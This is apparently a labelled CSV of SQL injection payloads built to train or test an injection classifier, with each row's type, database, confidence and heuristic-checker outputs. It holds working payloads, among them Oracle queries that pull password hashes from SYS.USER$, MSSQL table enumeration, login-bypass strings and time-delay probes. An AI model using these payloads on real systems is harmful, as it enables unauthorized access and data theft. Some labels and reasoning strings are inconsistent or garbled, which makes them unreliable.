payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",error_based,oracle,0.95,all_tab_columns with utl_inaddr for Oracle error-based SQLi,KEEP,,error_based,oracle,14,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 5 ) ) AND 'i' = 'i"
"select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'",union_based,mysql,0.9,%!<@ obfuscation bypass with UNION SELECT,KEEP,,union_based,mysql,15,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'"
"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",boolean_blind,mysql,0.85,"& obfuscation for boolean-based blind SQLi""",KEEP,,boolean_blind,mysql,16,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1"
"select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",boolean_blind,mysql,0.85,? obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,17,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1"
distinct,benign,unknown,0.7,Plain keyword 'distinct' is not an attack,KEEP,,benign,unknown,18,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,distinct
select * from users where id = '1' * ( \ ) or 1 = 1 -- 1',boolean_blind,mysql,0.85,*\ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,19,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = '1' * ( \ ) or 1 = 1 -- 1'
"1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116",boolean_blind,mssql,0.9,ascii/substring with sysobjects is MSSQL boolean blind SQLi,KEEP,,boolean_blind,mssql,20,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,"1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116"
select * from users where id = 1 or \.<\ or 1 = 1 -- 1,boolean_blind,mysql,0.85,\. obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,21,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or \.<\ or 1 = 1 -- 1
"admin"" or ""1"" = ""1""--",auth_bypass,mysql,0.95,"admin"" or \\""1\""\""=\""\""1\""-- is MySQL auth bypass""",KEEP,,auth_bypass,mysql,22,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"admin"" or ""1"" = ""1""--"
"select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,%{ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,23,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""%{"" or 1 = 1 -- 1"
insert,benign,unknown,0.7,"Plain keyword 'insert' is DML, not attack without context",KEEP,,benign,unknown,24,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,insert
"select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.85,# obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,25,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1"
"select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,%? obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,26,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""%?"" or 1 = 1 -- 1"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",error_based,oracle,0.95,SYS.USER$ with utl_inaddr is Oracle error-based SQLi,KEEP,,error_based,oracle,27,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i"
"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,)# obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,28,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""?#"" or 1 = 1 -- 1"
"or 1 = 1 or """" =",boolean_blind,generic,0.9,Double quote + empty string for boolean-based blind SQLi,KEEP,,boolean_blind,generic,29,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","or 1 = 1 or """" ="
or 1 = 1,boolean_blind,generic,0.95,Simple or 1=1 for generic boolean blind SQLi,KEEP,,boolean_blind,generic,30,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 1 = 1
"select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",boolean_blind,mysql,0.85,Quote obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,31,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "". ( "" or 1 = 1 -- 1"
"select * from users where id = '1' union select ||/1,version ( ) -- 1'",union_based,mysql,0.9,||/1 with version() indicates union-based SQLi,KEEP,,union_based,mysql,32,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select ||/1,version ( ) -- 1'"
"select * from users where id = '1' union select +\.,@@VERSION -- 1'",union_based,mssql,0.9,+\. obfuscation + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,33,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select +\.,@@VERSION -- 1'"
or 1 = 1/*,boolean_blind,generic,0.9,Comment truncation for generic boolean blind SQLi,KEEP,,boolean_blind,generic,34,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 1 = 1/*
' or 1 = 1,boolean_blind,generic,0.9,Tautology or 1=1 for boolean blind SQLi,KEEP,,boolean_blind,generic,35,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",' or 1 = 1
"select * from users where id = 1 <@&@ union select 1,version ( ) -- 1",union_based,mysql,0.85,<@&@ obfuscation + UNION SELECT,KEEP,,union_based,mysql,36,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 <@&@ union select 1,version ( ) -- 1"
"select * from users where id = '1' union select $*$,@@VERSION -- 1'",union_based,mssql,0.9,$*$ obfuscation + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,37,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select $*$,@@VERSION -- 1'"
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",out_of_band,mysql,0.9,load_file with char() for OOB file read,KEEP,,out_of_band,mysql,38,out_of_band,generic,Pattern match: 'load_file (' → out_of_band (P6); DB signature: generic,out_of_band,generic,OOB file/network function,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ..."
"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",union_based,mssql,0.9,$1 obfuscation + UNION SELECT for MSSQL,KEEP,,union_based,mssql,39,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'"
select * from users where id = 1 or \.<1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,\. obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,40,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or \.<1 or 1 = 1 -- 1
"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",union_based,mssql,0.85,\<\ bypass + UNION SELECT for MSSQL,KEEP,,union_based,mssql,41,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'"
"select * from users where id = 1 union select 1||1,version ( ) -- 1",union_based,mysql,0.9,1||1 with version() indicates union-based SQLi,KEEP,,union_based,mysql,42,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select 1||1,version ( ) -- 1"
"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,v$version + rownum for Oracle union-based SQLi,KEEP,,union_based,oracle,43,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1"
select * from users where id = '1' or \.<\ or 1 = 1 -- 1',boolean_blind,mysql,0.85,\. obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,44,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = '1' or \.<\ or 1 = 1 -- 1'
"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,]} obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,45,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""]{"" or 1 = 1 -- 1"
"select * from users where id = 1 or "".@"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,.@ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,46,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "".@"" or 1 = 1 -- 1"
"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",boolean_blind,mysql,0.85,$[ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,47,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""$["" or 1 = 1 -- 1"
or 1 --',boolean_blind,generic,0.9,or 1 -- is generic boolean blind SQLi,KEEP,,boolean_blind,generic,48,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or 1 --'
"select * from users where id = 1 or "",;"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,";, obfuscation for boolean-based blind SQLi",KEEP,,boolean_blind,mysql,49,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "",;"" or 1 = 1 -- 1"
"admin"" or 1 = 1#",auth_bypass,mysql,0.95,"admin"" or 1=1# is MySQL auth bypass",KEEP,,auth_bypass,mysql,50,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","admin"" or 1 = 1#"
"select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,v$version + rownum for Oracle union SQLi,KEEP,,union_based,oracle,51,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1"
PRINT,benign,generic,0.7,PRINT is valid SQL not attack standalone,KEEP,,benign,generic,52,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,PRINT
"select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'",union_based,mssql,0.85,\. obfuscation + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,53,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'"
or 1 = 1--,boolean_blind,generic,0.9,or 1=1-- is generic boolean blind SQLi,KEEP,,boolean_blind,generic,54,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 1 = 1--
1 or pg_sleep ( __TIME__ ) --,time_blind,postgresql,0.95,pg_sleep is PostgreSQL time-based blind SQLi,KEEP,,time_blind,postgresql,55,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,benign,generic,no SQLi signal in heuristic check,1 or pg_sleep ( __TIME__ ) --
"select * from users where id = 1 or "",#"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"#,# obfuscation for boolean-based blind SQLi",KEEP,,boolean_blind,mysql,56,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "",#"" or 1 = 1 -- 1"
admin' ) or ( '1' = '1'/*,auth_bypass,generic,0.9,admin') or ('1'='1'/* for auth bypass,KEEP,,auth_bypass,generic,57,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,admin' ) or ( '1' = '1'/*
or 2 between 1 and 3,boolean_blind,generic,0.85,BETWEEN for generic boolean-based blind SQLi,KEEP,,boolean_blind,generic,58,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or 2 between 1 and 3
"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.8,). obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,59,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1"
"select * from users where id = 1 or 1#"". union select null,version ( ) -- 1",union_based,mysql,0.9,# + UNION SELECT for union-based SQLi,KEEP,,union_based,mysql,60,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#"". union select null,version ( ) -- 1"
admin' or '1' = '1,auth_bypass,generic,0.95,admin' or '1'='1 is classic auth bypass,KEEP,,auth_bypass,generic,61,auth_bypass,generic,Pattern match: 'admin' or '1' = '1' → auth_bypass (P2); DB signature: generic,auth_bypass,generic,admin' prefix near boolean/comment context,admin' or '1' = '1
; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --,time_blind,mssql,0.95,waitfor delay is MSSQL time-based blind SQLi,KEEP,,time_blind,mssql,62,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --
"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,v$version for Oracle union-based SQLi,KEEP,,union_based,oracle,63,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1"
""" or 0 = 0 --",boolean_blind,generic,0.9,"\\"" or 0=0-- is generic boolean blind SQLi""",KEEP,,boolean_blind,generic,64,boolean_blind,generic,Pattern match: 'or 0 = 0' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",""" or 0 = 0 --"
"select * from users where id = 1 union select @ $_,version ( ) -- 1",union_based,mysql,0.85,@$_ obfuscation + version() for union SQLi,KEEP,,union_based,mysql,65,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select @ $_,version ( ) -- 1"
select * from users where id = 1 <@.$ or 1 = 1 -- 1,boolean_blind,mysql,0.8,<@.$ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,66,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 <@.$ or 1 = 1 -- 1
"select * from users where id = 1 or ""%."" or 1 = 1 -- 1",boolean_blind,mysql,0.85,%.. obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,67,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""%."" or 1 = 1 -- 1"
"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",union_based,mssql,0.9,$+*$ + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,68,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1"
"select * from users where id = 1 or "",."" or 1 = 1 -- 1",boolean_blind,mysql,0.85,",.\ obfuscation for boolean-based blind SQLi""",KEEP,,boolean_blind,mysql,69,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "",."" or 1 = 1 -- 1"
"select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,1& obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,70,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""1&"" or 1 = 1 -- 1"
admin' ) or ( '1' = '1,auth_bypass,generic,0.9,admin') or ('1'='1 is auth bypass,KEEP,,auth_bypass,generic,71,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,admin' ) or ( '1' = '1
"or 0 = 0 #""",boolean_blind,generic,0.85,or 0=0 # is boolean blind SQLi,KEEP,,boolean_blind,generic,72,boolean_blind,generic,Pattern match: 'or 0 = 0' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","or 0 = 0 #"""
"select * from users where id = 1 or "".]"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,"].\ obfuscation for boolean-based blind SQLi""",KEEP,,boolean_blind,mysql,73,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "".]"" or 1 = 1 -- 1"
) or ( 'x' = 'x,boolean_blind,generic,0.9,) or ('x'='x' is boolean blind SQLi,KEEP,,boolean_blind,generic,74,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,) or ( 'x' = 'x
"select * from users where id = 1.<@$ union select 1,version ( ) -- 1",union_based,mysql,0.85,.<@$ union select for union-based SQLi,KEEP,,union_based,mysql,75,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1.<@$ union select 1,version ( ) -- 1"
$ ( sleep 50 ),time_blind,generic,0.9,$ ( sleep 50 ) is time-based blind SQLi,KEEP,,time_blind,generic,76,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,$ ( sleep 50 )
"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,*1 + v$version for Oracle union SQLi,KEEP,,union_based,oracle,77,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1"
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",union_based,mssql,0.95,sysobjects with xtype='u' for MSSQL union,KEEP,,union_based,mssql,78,union_based,mssql,Pattern match: 'union all select' → union_based (P7); DB signature: mssql,union_based,mssql,UNION SELECT structure,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --"
